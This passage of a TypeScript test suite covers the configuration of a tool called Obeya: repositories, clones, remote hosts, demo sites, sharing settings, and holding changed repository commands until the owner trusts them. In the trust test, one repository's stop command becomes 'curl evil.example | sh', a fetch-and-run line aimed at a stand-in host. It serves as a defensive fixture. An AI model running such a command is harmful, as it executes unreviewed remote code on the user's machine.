import { afterEach, beforeEach, describe, expect, test } from 'bun:test';
import { existsSync, mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from 'node:fs';
import { homedir, tmpdir } from 'node:os';
import { join } from 'node:path';
import { z } from 'zod';
import { blocksSaving, type CanvasConfig, type ConfigView, type DemoSettingsView, type LanguageView } from '../core/types';
import { Board } from './board';
import { CanvasRuntime, type StartFailure } from './canvas';
import { clipProblems, Config, demoSettingsProblems, readConfigFile } from './config';
import { Store } from './db';
import { serve } from './server';
import { ownerLanguage } from './settings';
import { asOwner, FakeRuntime, gitClone, gitRepo, noForge, syncGitCalls, until } from './testing';
import { git } from './workspaces';

let dir: string;
let store: Store;
let web: string;
let api: string;
let file: string;
let restarts: number;
let applied: number;
/** The ids of the configurations the running canvases took over. */
let taken: (string | null)[][];

function repo(name: string) {
  return gitRepo(join(dir, name));
}

const config = (source: 'file' | 'args', started: CanvasConfig[], running: string[] = []) =>
  new Config({
    file,
    source,
    started,
    store,
    running: () => running,
    server: { port: 4417, home: dir, permissionMode: 'auto' },
    // not the machine's lock: a demo another agent renders meanwhile would hold up the sample
    ttsLock: join(dir, 'tts.lock'),
    restart: () => void restarts++,
    apply: (_, ids) => void taken.push(ids),
    onSettings: () => void applied++,
  });

beforeEach(() => {
  dir = mkdtempSync(join(tmpdir(), 'obeya-config-'));
  store = new Store(':memory:');
  web = repo('web');
  api = repo('api');
  file = join(dir, 'home', 'canvases.json');
  restarts = 0;
  applied = 0;
  taken = [];
});
afterEach(() => rmSync(dir, { recursive: true, force: true }));

describe("Obeya's configuration", () => {
  test('says what each canvas amounts to: its id, name, repositories and where their workers work', async () => {
    api = gitRepo(join(dir, 'api-own'), { '.obeya/settings.json': '{ "workspaces": "clones" }\n' });
    const c = config('args', [{ name: 'Produkt', repos: [{ path: web }, { path: api }] }], ['produkt']);
    expect(c.view()).toMatchObject({ file, source: 'args', running: ['produkt'], restarting: false, server: { port: 4417, restarts: true } });
    const checked = await c.checkSaved();
    expect(checked.problems).toEqual([]);
    expect(checked.resolved).toMatchObject([
      {
        id: 'produkt',
        name: 'Produkt',
        repos: [
          { id: 'web', workspaces: 'worktrees' },
          { id: 'api-own', workspaces: 'clones' },
        ],
      },
    ]);
  });

  test('a repository whose configuration names clones works in clones, whatever its settings say', async () => {
    const c = config('file', []);
    const mode = async (r: object) => (await c.check([{ repos: [{ path: web, ...r }] }])).resolved[0]!.repos[0]!.workspaces;
    expect(await mode({})).toBe('worktrees');
    expect(await mode({ clones: 2 })).toBe('clones');
    expect(await mode({ workspaces: [api] })).toBe('clones');
    expect(await mode({ settings: { workspaces: 'worktrees' }, clones: 1 })).toBe('clones');
  });

  test("says which clones of a running canvas's pool a configuration no longer names, and which card holds one", async () => {
    const c = config('file', [], ['web']);
    const board = new Board(store, { id: 'web', name: 'web', repos: [{ id: 'web', name: 'web', path: web, branch: 'main' }] }, () => ({ docs: [], dirs: [] }));
    const made = [1, 2, 3].map((i) => gitRepo(join(dir, 'workspaces', 'web', String(i))));
    const own = gitRepo(join(dir, 'own'));
    // a card's worktree is no clone
    const tree = join(dir, 'workspaces', 'web', '12345678');
    mkdirSync(tree, { recursive: true });
    writeFileSync(join(tree, '.git'), 'gitdir: elsewhere\n');
    for (const p of [...made, own, tree, 'ssh://gpu/far/1', 'ssh://gpu/far/2']) store.addWorkspace('web', p);
    store.setLease(made[2]!, board.create({ title: 'Login', x: 0, y: 0 }).id);
    const leaving = async (r: object) => (await c.check([{ repos: [{ path: web, ...r }] }])).resolved[0]!.repos[0]!.leaving;
    expect(await leaving({ clones: 3, workspaces: [own], hosts: [{ name: 'gpu', ssh: 'gpu', root: '/far', clones: 2 }] })).toBeUndefined();
    expect(await leaving({ clones: 1, hosts: [{ name: 'gpu', ssh: 'gpu', root: '/far', clones: 1 }] })).toEqual([
      { path: own },
      { path: made[1]!, made: 2 },
      { path: made[2]!, made: 3, card: 'Login' },
      { path: '/far/2', host: 'gpu', made: 2 },
    ]);
    // in worktrees, every clone leaves
    expect((await leaving({ settings: { workspaces: 'worktrees' } }))?.map((x) => x.path)).toEqual([own, ...made, '/far/1', '/far/2']);
  });

  test('a folder without git is checked as a folder, and keeps neither clones nor hosts', async () => {
    const c = config('file', []);
    const docs = join(dir, 'Dokumente');
    mkdirSync(join(docs, '.obeya'), { recursive: true });
    writeFileSync(join(docs, '.obeya', 'settings.json'), '{ "checks": ["true"] }');
    const checked = await c.check([{ repos: [{ path: docs, git: false, clones: 2, hosts: [{ name: 'h', ssh: 'h', root: '~', clones: 1 }] }] }]);
    expect(checked.problems).toEqual([]);
    expect(checked.canvases[0]!.repos[0]).toEqual({ path: docs, git: false });
    expect(checked.resolved[0]!.repos[0]).toMatchObject({ id: 'dokumente', folder: true, values: { checks: { value: ['true'], source: 'repository' } } });
    expect((await c.check([{ repos: [{ path: join(dir, 'nowhere'), git: false }] }])).problems.map((p) => p.code)).toEqual(['noFolder']);
  });

  test('finds what keeps a configuration from working, by canvas and repository', async () => {
    const c = config('file', []);
    const { problems } = (await c.check([
      { name: 'A', repos: [{ path: web }, { path: join(dir, 'nowhere') }] },
      { name: 'B', repos: [{ path: api, workspaces: [join(dir, 'nowhere')] }] },
      { name: 'Leer', repos: [] },
    ]));
    expect(problems.map(({ code, canvas, repo }) => ({ code, canvas, repo }))).toEqual([
      { code: 'notRepo', canvas: 0, repo: 1 },
      { code: 'notClone', canvas: 1, repo: 0 },
      { code: 'noRepo', canvas: 2, repo: undefined },
    ]);
    // the id follows the name, unless it is kept
    expect((await c.check([{ name: 'Neuer Name', id: 'web', repos: [{ path: web }] }])).resolved[0]).toMatchObject({ id: 'web', name: 'Neuer Name' });
    expect((await c.check([{ name: 'Web', repos: [{ path: web }] }, { name: 'web', repos: [{ path: api }] }])).problems).toMatchObject([{ code: 'sameId', canvas: 1 }]);
    // a repository once per canvas, by whatever path it is named
    expect((await c.check([{ name: 'Web', repos: [{ path: web }, { path: api }, { path: `${web}/` }] }])).problems).toMatchObject([{ code: 'sameRepo', canvas: 0, repo: 2 }]);
    expect((await c.check([])).problems.map((p) => p.code)).toEqual(['noCanvas']);
    expect((await c.check([{ repos: [{ path: web, color: 'red' }] }])).problems.map((p) => p.code)).toEqual(['invalid']);
    expect((await c.check({})).problems.map((p) => p.code)).toEqual(['invalid']);
  });

  test('a listed clone is one of the repository, whether its origin is over https or ssh', async () => {
    const c = config('file', []);
    git(web, 'remote', 'add', 'origin', 'https://github.com/acme/web.git');
    const clone = (name: string, origin: string) => {
      const path = join(dir, name);
      gitClone(web, path);
      git(path, 'remote', 'set-url', 'origin', origin);
      return path;
    };
    const ssh = clone('web-ssh', 'git@github.com:acme/web.git');
    const https = clone('web-https', 'https://github.com/acme/web');
    const local = join(dir, 'web-local');
    gitClone(web, local);
    const other = clone('api-clone', 'git@github.com:acme/api.git');
    const check = async (workspaces: string[]) => (await c.check([{ repos: [{ path: web, workspaces }] }])).problems;
    expect(await check([web, ssh, https, local])).toEqual([]);
    expect(await check([ssh, other])).toMatchObject([{ code: 'otherClone', canvas: 0, repo: 0, detail: expect.stringContaining(other) }]);
    expect((await check([other])).filter(blocksSaving)).toHaveLength(1);
  });

  test("a repository whose path is still empty reads nothing, the server's working directory least of all", async () => {
    // the server runs in a repository with settings and commands of its own
    const own = gitRepo(join(dir, 'server'), { '.obeya/settings.json': JSON.stringify({ checks: ['make check'] }) });
    const cwd = process.cwd();
    process.chdir(own);
    try {
      const c = config('file', []);
      for (const path of ['', '  ']) {
        const checked = await c.check([{ repos: [{ path: web }] }, { repos: [{ path }] }, { repos: [{ path, git: false }] }]);
        expect(checked.problems).toEqual([
          { code: 'noPath', canvas: 1, repo: 0, detail: 'a repository needs a path' },
          { code: 'noPath', canvas: 2, repo: 0, detail: 'a repository needs a path' },
        ]);
        expect(checked.resolved.map((r) => r?.name ?? null)).toEqual(['web', null, null]);
      }
    } finally {
      process.chdir(cwd);
    }
  });

  test("a repository's share command, which went, is dropped from the file as it is read", async () => {
    mkdirSync(join(dir, 'home'));
    writeFileSync(file, JSON.stringify([{ name: 'Web', repos: [{ path: web, share: 'share.ts', clones: 2 }] }]));
    expect(readConfigFile(file)).toEqual([{ name: 'Web', repos: [{ path: web, clones: 2 }] }]);
    // the dialog sends none
    expect((await config('file', []).check([{ repos: [{ path: web, share: 'share.ts' }] }])).problems.map((p) => p.code)).toEqual(['invalid']);
  });

  test('hosts: tidied, only for a repository with clones whose work goes out through its remote, one machine per name', async () => {
    const c = config('file', []);
    Bun.spawnSync(['git', '-C', web, 'remote', 'add', 'origin', 'https://github.com/acme/web.git']);
    const host = { name: 'Box', ssh: 'me@box.local', root: '~/obeya/web', clones: 2 };
    const check = (repos: object[]) => c.check([{ repos }]);
    expect(await check([{ path: web, hosts: [host, { name: ' ', ssh: '', root: '', clones: 1 }] }])).toMatchObject({ problems: [], canvases: [{ repos: [{ path: web, hosts: [host] }] }] });
    expect((await check([{ path: web, hosts: [{ ...host, root: ' ' }] }])).canvases[0]!.repos[0]!.hosts).toEqual([{ ...host, root: '~/obeya' }]);
    // slots here and there, 0 included (no new cards there); left out, as many as there are clones
    expect((await check([{ path: web, slots: 0, hosts: [{ ...host, slots: 1 }] }])).canvases[0]!.repos[0]).toMatchObject({ slots: 0, hosts: [{ ...host, slots: 1 }] });
    expect((await check([{ path: web, hosts: [host] }])).canvases[0]!.repos[0]).not.toHaveProperty('slots');
    // landing on the main of this checkout, or no remote: the host could not clone it
    expect((await check([{ path: web, settings: { land: 'main' }, hosts: [host] }])).problems.map((p) => p.code)).toEqual(['hostRepo']);
    expect((await check([{ path: api, hosts: [host] }])).problems.map((p) => p.code)).toEqual(['hostRepo']);
    Bun.spawnSync(['git', '-C', api, 'remote', 'add', 'origin', 'https://github.com/acme/api.git']);
    expect((await check([{ path: web, hosts: [host] }, { path: api, hosts: [{ ...host, ssh: 'other@box.local' }] }])).problems).toEqual([{ code: 'hostName', canvas: 0, repo: 1, detail: expect.stringContaining('me@box.local') }]);
    expect((await check([{ path: web, hosts: [{ ...host, name: 'a/b' }] }])).problems.map((p) => p.code)).toEqual(['invalid']);
  });

  test("a demo site that cannot be used is a problem at the repository", async () => {
    const site = { title: 'Demos', url: 'https://demos.example.dev', deploy: 'no-such-deploy-anywhere {dir}' };
    const own = gitRepo(join(dir, 'shop'), { '.obeya/settings.json': JSON.stringify({ demo: { site } }) });
    const c = config('args', [{ repos: [{ path: web }] }]);
    const checked = (await c.check([{ repos: [{ path: own }] }]));
    expect(checked.problems[0]).toEqual({ code: 'demoSite', canvas: 0, repo: 0, detail: "demo.site.deploy: the deploy command's program no-such-deploy-anywhere is not on the PATH" });
    // a site the owner did not trust yet besides
    expect(checked.problems.slice(1).map((p) => p.code)).toEqual(['untrusted']);
    expect(checked.resolved[0]!.repos[0]!.values.demo.site).toEqual({ value: site, source: 'repository', held: true });
    // one this machine sets without a URL
    expect((await c.check([{ repos: [{ path: web, settings: { demo: { site: { ...site, url: 'demos', deploy: 'git {dir}' } } } }] }])).problems.map((p) => p.detail)).toEqual(['demo.site.url: expected an http(s) URL']);
  });

  test("a repository whose main branch still has an adapter module is a problem there, which keeps nothing from being saved", async () => {
    const own = gitRepo(join(dir, 'shop'), { '.obeya/adapter/index.ts': "export default { name: 'shop' };\n", '.obeya/settings.json': '{ "setup": "bun install" }\n' });
    const c = config('args', [{ repos: [{ path: web }] }]);
    const checked = (await c.check([{ repos: [{ path: web }, { path: own }] }]));
    expect(checked.problems).toEqual([{ code: 'adapterGone', canvas: 0, repo: 1, detail: '.obeya/adapter/ on the main branch is no longer read; what it says belongs in .obeya/settings.json' }]);
    expect(checked.resolved[0]!.repos[1]).toMatchObject({ id: 'shop', adapterGone: true });
    expect(checked.resolved[0]!.repos[0]!.adapterGone).toBeUndefined();
    expect((await c.save([{ repos: [{ path: web }, { path: own }] }]))).toEqual({ restarting: true });
  });

  test("keeps a canvas's home repository: leaving it out is a problem, moving it is not", async () => {
    store.ensureCanvas('produkt', 'Produkt');
    store.setSetting('produkt', 'home_repo', 'web');
    const c = config('file', []);
    expect((await c.check([{ name: 'Produkt', repos: [{ path: api }] }])).problems.map((p) => p.code)).toEqual(['homeMissing']);
    const moved = (await c.check([{ name: 'Produkt', repos: [{ path: api }, { path: web }] }]));
    expect(moved.problems).toEqual([]);
    // listed in the order given, though the home one runs first
    expect(moved.resolved[0]!.repos.map((r) => r.id)).toEqual(['api', 'web']);
  });

  test('saves a configuration that works, tidied, and starts Obeya again; one with problems is refused', async () => {
    const c = config('args', [{ repos: [{ path: web }] }]);
    await expect(c.save([{ repos: [{ path: join(dir, 'nowhere') }] }])).rejects.toThrow();
    expect(existsSync(file)).toBe(false);
    expect(restarts).toBe(0);

    expect((await c.save([{ name: ' ', repos: [{ path: web, workspaces: [' '], clones: 0 }, { path: api, clones: 2 }] }]))).toEqual({ restarting: true });
    expect(JSON.parse(readFileSync(file, 'utf8'))).toEqual([{ repos: [{ path: web }, { path: api, clones: 2 }] }]);
    expect(readConfigFile(file)).toEqual([{ repos: [{ path: web }, { path: api, clones: 2 }] }]);
    expect(restarts).toBe(1);
    expect(c.view().restarting).toBe(true);
    // saved again before the restart: the file has the latest, and the restart is already on its way
    (await c.save([{ repos: [{ path: api }] }]));
    expect(restarts).toBe(1);
  });

  test("a file from before demo.language reads without its site's language, the site kept", async () => {
    const site = { title: 'Demos', url: 'https://demos.example.dev', deploy: 'deploy {dir}' };
    mkdirSync(join(dir, 'home'));
    writeFileSync(file, JSON.stringify([{ repos: [{ path: web, settings: { demo: { site: { ...site, language: 'de' } } } }] }]));
    expect(readConfigFile(file)).toEqual([{ repos: [{ path: web, settings: { demo: { site } } }] }]);
    // so does a draft the dialog kept from before
    expect((await config('file', []).check([{ repos: [{ path: web, settings: { demo: { site: { ...site, language: 'de' } } } }] }])).problems.map((p) => p.code)).not.toContain('invalid');
  });

  test("saved from the file, the running canvases take it over without a restart: settings tidied, canvases and repositories as they come", async () => {
    mkdirSync(join(dir, 'home'));
    writeFileSync(file, JSON.stringify([{ repos: [{ path: web }] }]));
    const c = config('file', [{ repos: [{ path: web }] }]);
    expect((await c.save([{ repos: [{ path: web, settings: { land: 'main', checks: ['bun test', ' '], branch: ' ', setup: '', planDocs: { dir: '', exclude: [] } } }] }]))).toEqual({ restarting: false, applied: true });
    expect(readConfigFile(file)).toEqual([{ repos: [{ path: web, settings: { land: 'main', checks: ['bun test'], setup: '' } }] }]);
    expect(c.repoSettings(web)).toEqual({ land: 'main', checks: ['bun test'], setup: '' });
    expect(c.repoSettings(api)).toBeUndefined();
    // set back to what comes from elsewhere: nothing set
    (await c.save([{ repos: [{ path: web, settings: {} }] }]));
    expect(readConfigFile(file)).toEqual([{ repos: [{ path: web }] }]);
    expect(c.repoSettings(web)).toBeUndefined();
    // the language of the repository's demos, beside its site or alone
    (await c.save([{ repos: [{ path: web, settings: { demo: { language: 'en' } } }] }]));
    expect(c.repoSettings(web)).toEqual({ demo: { language: 'en' } });
    expect((await c.save([{ repos: [{ path: web, settings: { workspaces: 'clones' } }] }]))).toEqual({ restarting: false, applied: true });
    expect((await c.save([{ repos: [{ path: web, clones: 2 }] }, { name: 'API', repos: [{ path: api }] }]))).toEqual({ restarting: false, applied: true });
    expect(taken).toEqual([['web'], ['web'], ['web'], ['web'], ['web', 'api']]);
    expect(restarts).toBe(0);
    expect(c.view().restarting).toBe(false);
  });

  test("what does not run as configured is a problem at its canvas or repository that blocks nothing; „Erneut versuchen“ has the canvases take the configuration over again", async () => {
    mkdirSync(join(dir, 'home'));
    const saved = [{ name: 'Web', repos: [{ path: web }] }, { name: 'API', repos: [{ path: api }, { path: web }] }];
    writeFileSync(file, JSON.stringify(saved));
    const failures: StartFailure[] = [
      { canvas: 'web', detail: 'git broke' },
      { canvas: 'api', repo: 'web', detail: 'no clone', before: true },
      { canvas: 'gone', detail: 'no longer configured' },
    ];
    const c = new Config({ file, source: 'file', started: saved, store, running: () => ['api'], server: { port: 4417, home: dir, permissionMode: 'auto' }, apply: (_, ids) => void taken.push(ids), failures: () => failures });
    const { problems } = await c.checkSaved();
    expect(problems).toEqual([
      { code: 'canvasDown', canvas: 0, detail: 'git broke' },
      { code: 'repoBefore', canvas: 1, repo: 1, detail: 'no clone' },
    ]);
    expect(problems.filter(blocksSaving)).toEqual([]);
    failures[1] = { canvas: 'api', repo: 'web', detail: 'no clone' };
    expect((await c.checkSaved()).problems[1]).toMatchObject({ code: 'repoDown', canvas: 1, repo: 1 });
    expect(await c.retry()).toEqual({});
    expect(taken).toEqual([['web', 'api']]);
  });

  test("shows each repository's settings without this machine's, with where each comes from", async () => {
    const c = config('file', []);
    const values = async (r: object) => (await c.check([{ repos: [{ path: web, ...r }] }])).resolved[0]!.repos[0]!.values;
    expect(await values({})).toMatchObject({
      branch: { value: 'main', source: 'detected' },
      land: { value: 'main', source: 'detected' },
      checks: { value: [], source: 'default' },
      planDocs: { value: { dir: 'docs/plan' }, source: 'default' },
      workspaces: { value: 'worktrees', source: 'default' },
      app: { run: { value: '', source: 'default' } },
    });
    // this machine's own come on top, in the draft: the values beside them stay what they would be without
    const own = gitRepo(join(dir, 'own'), { '.obeya/settings.json': '{ "land": "main", "checks": ["bun test"], "app": { "run": "bun dev" } }\n' });
    const ownValues = (await c.check([{ repos: [{ path: own, settings: { land: 'pr' } }] }])).resolved[0]!.repos[0]!.values;
    expect(ownValues).toMatchObject({ land: { value: 'main', source: 'repository' }, checks: { source: 'repository' }, planDocs: { source: 'default' }, app: { run: { source: 'repository' } } });
    expect((await values({ clones: 1 })).workspaces).toEqual({ value: 'clones', source: 'clones' });
    const problems = async (branch: string) => (await c.check([{ repos: [{ path: web, settings: { branch } }] }])).problems.map((p) => p.code);
    expect(await problems('main')).toEqual([]);
    expect(await problems('nope')).toEqual(['noBranch']);
  });

  test("a repository's .obeya/settings.json: its values show as from the repository, what is wrong in it as a problem that blocks nothing", async () => {
    const shop = gitRepo(join(dir, 'shop'), { 'README.md': 'hi\n', '.obeya/settings.json': '{ "checks": ["bun test"], "check": [] }\n' });
    const c = config('file', []);
    const { resolved, problems } = (await c.check([{ repos: [{ path: shop }] }]));
    expect(resolved[0]!.repos[0]!.values.checks).toEqual({ value: ['bun test'], source: 'repository' });
    expect(problems).toEqual([{ code: 'repoSettings', canvas: 0, repo: 0, detail: '.obeya/settings.json, check: no such field (did you mean checks?)' }]);
    expect(blocksSaving(problems[0]!)).toBe(false);
  });

  test("a repository's commands, new or changed on its default branch, wait for the owner's trust; this machine's need none", async () => {
    mkdirSync(join(dir, 'home'));
    const app = { run: 'bun dev', stop: 'pkill -F .dev.pid' };
    const own = gitRepo(join(dir, 'shop'), { '.obeya/settings.json': JSON.stringify({ checks: ['bun test'], app }), '.mcp.json': '{"mcpServers":{}}' });
    writeFileSync(file, JSON.stringify([{ repos: [{ path: own }] }]));
    const c = config('file', [{ repos: [{ path: own }] }]);
    let checked = await c.checkSaved();
    expect(checked.problems.map((p) => p.code)).toEqual(['untrusted']);
    expect(blocksSaving(checked.problems[0]!)).toBe(false);
    const trust = checked.resolved[0]!.repos[0]!.trust!;
    expect(trust).toEqual({ held: ['app', 'claude'], now: { app: { stop: app.stop }, claude: { '.mcp.json': { id: expect.any(String), text: '{"mcpServers":{}}' } } } });
    expect(checked.resolved[0]!.repos[0]!.values.app).toMatchObject({ run: { source: 'repository' }, stop: { value: app.stop, source: 'repository', held: true } });
    expect(checked.resolved[0]!.repos[0]!.values.app.run.held).toBeUndefined();

    // what the dialog showed is trusted; commands that changed since are not
    await expect(c.trust({ path: own, seen: { app: { stop: 'other' } }, held: ['app'] })).rejects.toThrow(expect.objectContaining({ code: 'trustChanged' }));
    // git reads the commands without the server waiting for it
    const synced = syncGitCalls();
    await c.trust({ path: own, seen: trust.now, held: trust.held });
    expect(synced.stop()).toEqual([]);
    expect(applied).toBe(1);
    checked = await c.checkSaved();
    expect(checked.problems).toEqual([]);
    expect(checked.resolved[0]!.repos[0]!.trust).toBeUndefined();

    // changed on the default branch: held again, with what was trusted before
    writeFileSync(join(own, '.obeya/settings.json'), JSON.stringify({ app: { ...app, stop: 'curl evil.example | sh' } }));
    git(own, 'commit', '--quiet', '-am', 'stop');
    checked = await c.checkSaved();
    expect(checked.resolved[0]!.repos[0]!.trust).toEqual({ held: ['app'], now: { app: { stop: 'curl evil.example | sh' }, claude: trust.now.claude }, before: trust.now });
    // this machine's stop and keep stand in its place: nothing waits
    expect((await c.check([{ repos: [{ path: own, settings: { app: { stop: 'make stop', keep: 'false' } } }] }])).problems).toEqual([]);
    // trusted with them, what they stand in for was not shown, so it stays untrusted
    writeFileSync(join(own, '.mcp.json'), '{"mcpServers":{"x":{}}}');
    git(own, 'commit', '--quiet', '-am', 'mcp');
    const mine = { app: { stop: 'make stop', keep: 'false' } };
    writeFileSync(file, JSON.stringify([{ repos: [{ path: own, settings: mine }] }]));
    const shown = (await c.checkSaved()).resolved[0]!.repos[0]!.trust!;
    expect(shown.held).toEqual(['claude']);
    await c.trust({ path: own, seen: shown.now, held: shown.held });
    expect(store.trustedCommands(own)).toEqual({ app: { stop: app.stop }, claude: { '.mcp.json': { id: expect.any(String), text: '{"mcpServers":{"x":{}}}' } } });
  });

  test("a new canvas's repository, still only in the dialog's draft, can be trusted before the canvas is saved", async () => {
    const own = gitRepo(join(dir, 'shop'), { '.obeya/settings.json': JSON.stringify({ app: { run: 'bun dev', stop: 'pkill -F .dev.pid' } }) });
    const c = config('file', []);
    const draft = [{ repos: [{ path: own }] }];
    const trust = (await c.check(draft)).resolved[0]!.repos[0]!.trust!;
    expect(trust.held).toEqual(['app']);
    await c.trust({ path: own, seen: trust.now, held: trust.held });
    expect((await c.check(draft)).problems).toEqual([]);
    await expect(c.trust({ path: join(dir, 'nowhere'), seen: {}, held: [] })).rejects.toThrow(expect.objectContaining({ code: 'invalid' }));
  });

  test("commands this machine's values put into the repository's settings are the owner's own: no trust step for them", async () => {
    mkdirSync(join(dir, 'home'));
    const settings = { app: { stop: 'make stop' } };
    writeFileSync(file, JSON.stringify([{ repos: [{ path: web, settings }] }]));
    const c = config('file', [{ repos: [{ path: web, settings }] }]);
    await c.shareSettings({ path: web });
    const checked = await c.checkSaved();
    expect(checked.resolved[0]!.repos[0]!.values.app.stop).toEqual({ value: 'make stop', source: 'repository' });
    expect(checked.problems).toEqual([]);
  });

  test("„Für alle ins Repository übernehmen“ where work lands on main: committed there, and this machine's values then come from the repository", async () => {
    mkdirSync(join(dir, 'home'));
    const settings = { branch: 'main', checks: ['bun test'], app: { run: 'bun dev' } };
    writeFileSync(file, JSON.stringify([{ repos: [{ path: web, settings }] }]));
    const c = config('file', [{ repos: [{ path: web, settings }] }]);
    expect((await c.checkSaved()).resolved[0]!.repos[0]!.shareTo).toBe('main');
    // the checkout's own change to the file is not overwritten
    mkdirSync(join(web, '.obeya'));
    writeFileSync(join(web, '.obeya/settings.json'), '{}\n');
    await expect(c.shareSettings({ path: web })).rejects.toMatchObject({ code: 'settingsDirty' });
    rmSync(join(web, '.obeya'), { recursive: true });
    // a change staged for something else stays staged, and out of the commit
    writeFileSync(join(web, 'README.md'), 'staged\n');
    git(web, 'add', 'README.md');

    const done = (await c.shareSettings({ path: web }));
    expect(done).toMatchObject({ branch: 'main', committed: git(web, 'rev-parse', 'main').trim() });
    expect(JSON.parse(git(web, 'show', 'main:.obeya/settings.json'))).toEqual({ checks: ['bun test'], app: { run: 'bun dev' } });
    expect(git(web, 'show', '--name-only', '--format=%s', 'main').trim()).toBe('Obeya settings for everyone: checks, app\n\n.obeya/settings.json');
    expect(git(web, 'status', '--porcelain').trim()).toBe('M  README.md');
    // the main branch stays this machine's; the rest come from the repository now
    expect(readConfigFile(file)).toEqual([{ repos: [{ path: web, settings: { branch: 'main' } }] }]);
    expect((await c.checkSaved()).resolved[0]!.repos[0]!.values).toMatchObject({ checks: { value: ['bun test'], source: 'repository' }, app: { run: { source: 'repository' } } });
    expect([applied, restarts]).toEqual([1, 0]);
    await expect(c.shareSettings({ path: web })).rejects.toMatchObject({ code: 'noSettings' });
  });

  test("„Für alle ins Repository übernehmen“ of a demo site's tags: saved with the site, committed with it; once the file has them, nothing is committed", async () => {
    mkdirSync(join(dir, 'home'));
    const site = { title: 'Demos', url: 'https://demos.example.com', deploy: 'deploy {dir}' };
    mkdirSync(join(web, '.obeya'));
    writeFileSync(join(web, '.obeya/settings.json'), JSON.stringify({ land: 'main', demo: { language: 'en', site } }, null, 2));
    git(web, 'add', '.obeya/settings.json');
    git(web, 'commit', '--quiet', '-m', 'settings');
    const c = config('file', []);
    // saved with the site, as the dialog has them
    const tags = { Area: ['Billing', 'Reports'], Kind: ['Fix'] };
    await c.save([{ repos: [{ path: web, settings: { demo: { site: { ...site, tags } } } }] }]);
    expect(readConfigFile(file)).toEqual([{ repos: [{ path: web, settings: { demo: { site: { ...site, tags } } } }] }]);

    const done = await c.shareSettings({ path: web });
    expect(done).toEqual({ committed: git(web, 'rev-parse', 'main').trim(), branch: 'main' });
    expect(JSON.parse(git(web, 'show', 'main:.obeya/settings.json'))).toEqual({ land: 'main', demo: { language: 'en', site: { ...site, tags } } });
    expect(readConfigFile(file)).toEqual([{ repos: [{ path: web }] }]);

    // this machine sets what the file holds already (in another order): no empty commit, and its values go
    const head = git(web, 'rev-parse', 'main').trim();
    await c.save([{ repos: [{ path: web, settings: { demo: { site: { tags, ...site } }, land: 'main' } }] }]);
    expect(await c.shareSettings({ path: web })).toEqual({ unchanged: true, branch: 'main' });
    expect(git(web, 'rev-parse', 'main').trim()).toBe(head);
    expect(readConfigFile(file)).toEqual([{ repos: [{ path: web }] }]);
  });

  test("„Für alle ins Repository übernehmen“ where work goes out as pull requests: one is opened, this machine keeps its values until it is merged", async () => {
    mkdirSync(join(dir, 'home'));
    const origin = join(dir, 'origin.git');
    gitClone(web, origin, { bare: true });
    git(web, 'remote', 'add', 'origin', origin);
    git(web, 'fetch', '--quiet', 'origin');
    const settings = { land: 'pr' as const, checks: ['bun test'] };
    writeFileSync(file, JSON.stringify([{ repos: [{ path: web, settings }] }]));
    const opened: { base: string; head: string; title: string }[] = [];
    const c = new Config({
      file,
      source: 'file',
      started: [{ repos: [{ path: web, settings }] }],
      store,
      running: () => [],
      server: { port: 4417, home: dir, permissionMode: 'auto' },
      forge: { ...noForge, open: async (_cwd, pr) => (opened.push(pr), 'https://github.com/acme/web/pull/7') },
      onSettings: () => void applied++,
    });
    const before = git(web, 'rev-parse', 'main').trim();
    expect((await c.shareSettings({ path: web }))).toEqual({ pr: 'https://github.com/acme/web/pull/7' });
    expect(opened).toEqual([expect.objectContaining({ base: 'main', head: expect.stringMatching(/^obeya-settings-\d{8}-\d{6}$/), title: 'Obeya settings for everyone: land, checks' })]);
    expect(JSON.parse(git(origin, 'show', `${opened[0]!.head}:.obeya/settings.json`))).toEqual(settings);
    expect(git(web, 'rev-parse', 'main').trim()).toBe(before);
    expect(readConfigFile(file)).toEqual([{ repos: [{ path: web, settings }] }]);
    // merged: the values the file now holds go from this machine's
    c.takenOver(web, undefined, { land: 'pr', checks: ['bun test'] });
    expect(readConfigFile(file)).toEqual([{ repos: [{ path: web }] }]);
    expect(applied).toBe(0);
  });

  test("„Für alle ins Repository übernehmen“ of what origin's main holds already: no pull request; this machine's values go only where the main branch Obeya reads has them too", async () => {
    mkdirSync(join(dir, 'home'));
    mkdirSync(join(web, '.obeya'));
    writeFileSync(join(web, '.obeya/settings.json'), JSON.stringify({ land: 'pr', checks: ['bun test'] }));
    git(web, 'add', '.obeya/settings.json');
    git(web, 'commit', '--quiet', '-m', 'settings');
    const origin = join(dir, 'origin.git');
    gitClone(web, origin, { bare: true });
    git(web, 'remote', 'add', 'origin', origin);
    git(web, 'fetch', '--quiet', 'origin');
    const opened: unknown[] = [];
    const settings = { checks: ['bun test'] };
    writeFileSync(file, JSON.stringify([{ repos: [{ path: web, settings }] }]));
    const c = new Config({ file, source: 'file', started: [], store, running: () => [], server: { port: 4417, home: dir, permissionMode: 'auto' }, forge: { ...noForge, open: async (_cwd, pr) => (opened.push(pr), 'https://github.com/acme/web/pull/7') } });
    // the local main is ahead of origin's with other checks: they are what Obeya reads, so this machine's stay
    writeFileSync(join(web, '.obeya/settings.json'), JSON.stringify({ land: 'pr', checks: ['bun test --local'] }));
    git(web, 'commit', '--quiet', '-am', 'local checks');
    expect(await c.shareSettings({ path: web })).toEqual({ unchanged: true, branch: 'main' });
    expect(opened).toEqual([]);
    expect(readConfigFile(file)).toEqual([{ repos: [{ path: web, settings }] }]);
    // with the local main where origin's is, they come from the repository
    git(web, 'reset', '--quiet', '--hard', 'origin/main');
    expect(await c.shareSettings({ path: web })).toEqual({ unchanged: true, branch: 'main' });
    expect(readConfigFile(file)).toEqual([{ repos: [{ path: web }] }]);
  });

  test("„Für alle ins Repository übernehmen“ straight onto origin's main, where work may go there beside pull requests", async () => {
    mkdirSync(join(dir, 'home'));
    const origin = join(dir, 'origin.git');
    gitClone(web, origin, { bare: true });
    git(web, 'remote', 'add', 'origin', origin);
    git(web, 'fetch', '--quiet', 'origin');
    const without = { land: 'pr' as const, checks: ['bun test'] };
    writeFileSync(file, JSON.stringify([{ repos: [{ path: web, settings: without }] }]));
    const c = config('file', [{ repos: [{ path: web, settings: without }] }]);
    expect((await c.checkSaved()).resolved[0]!.repos[0]!.shareDirect).toBeUndefined();
    await expect(c.shareSettings({ path: web, direct: true })).rejects.toMatchObject({ code: 'noDirect' });

    const settings = { ...without, direct: true };
    writeFileSync(file, JSON.stringify([{ repos: [{ path: web, settings }] }]));
    expect((await c.checkSaved()).resolved[0]!.repos[0]!.shareDirect).toBe(true);
